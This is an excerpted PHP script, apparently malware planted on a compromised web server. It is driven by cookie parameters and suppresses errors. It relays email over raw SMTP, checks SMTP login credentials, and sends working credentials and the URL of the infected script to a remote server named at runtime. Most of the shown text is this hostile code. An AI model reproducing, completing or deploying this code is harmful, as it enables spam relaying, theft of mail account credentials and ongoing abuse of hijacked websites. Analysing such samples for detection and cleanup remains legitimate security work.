...
error_reporting(0);
set_time_limit(0);
$a=$_COOKIE['a'];$ho=urldecode($_COOKIE['ho']);$mx=urldecode($_COOKIE['mx']);$po=$_COOKIE['po'];$ma=urldecode($_COOKIE['ma']);
$lo=urldecode($_COOKIE['lo']);$pa=urldecode($_COOKIE['pa']);$mt=urldecode($_COOKIE['mt']);$cc=urldecode($_COOKIE['cc']);
$bc=urldecode($_COOKIE['bc']);$fn=urldecode($_COOKIE['fn']);$or=urldecode($_COOKIE['or']);$eh=urldecode($_COOKIE['eh']);
...
$st=$_COOKIE['st'];$sm=urldecode($_COOKIE['sm']);
if($a=='r' or $a=='p' or $a=='c' or $a=='b' or $a=='l'){$rel=$ma.':'.$pa;}
if($a=='d' or $a=='m'){
...
$bo=str_replace("{br}", "\n", $bo);
if($ht=='1'){$bo='<html><head><title>'.$su.'</title>
...
if($ht=='1'){$header.="Content-Type: text/html;";}else{$header.="Content-Type: text/plain;";}
...
}else if(strripos($authcheck, 'PLAIN')){
fputs($fp,"AUTH PLAIN\r\n");$code = substr(get_data($fp),0,3);
...
if($code!=250){post_stats('E6'); fclose($fp); exit;}fputs($fp,"RCPT TO:<".$mt.">\r\n");$code = substr(get_data($fp),0,3);
if($cc){foreach($mscc as $mcc){
if($code!=250){post_stats('E7'); fclose($fp); exit;}fputs($fp,"RCPT TO:<".$mcc.">\r\n");$code = substr(get_data($fp),0,3);}}
if($bc){foreach($msbc as $mbc){
if($code!=250){post_stats('E7'); fclose($fp); exit;}fputs($fp,"RCPT TO:<".$mbc.">\r\n");$code = substr(get_data($fp),0,3);}}
...
if(!$ping){post_mch($sd,'C1',$rel);}
fclose($ping);
}
if($a=='c' or $a=='l'){
if($a=='l' and $mx){$smtp=$mx;}else{$smtp=smtp_lookup($ho);}
if($smtp){
...
function post_stats($stat){global $rt, $sd, $rel, $socks, $mt, $at;
$shl=urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);
$rel=urlencode($rel);$mt=urlencode($mt);$host=explode("/", $sd);$hp=explode(":", $host[0]);if(empty($hp[1])){$hp[1]='80';}
...
if($code != 235) {fclose($fp); return ("BAUTH");}fclose($fp);post_mch($sd,'OK',$rel.';||'.$host.'||'.$port.'||'.$mail.'||'.$pass);
}
...
function post_mch($sd,$stat,$rel){global $rt;$shl=urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);$rel=urlencode($rel);
$host=explode("/", $sd);$hp=explode(":", $host[0]);if(empty($hp[1])){$hp[1]='80';}$data='st='.$stat.';rl='.$rel.';sh='.$shl.';so=C2';
$socket = socket_create(AF_INET,SOCK_STREAM,0);socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array("sec" => $rt, "usec" => 0));
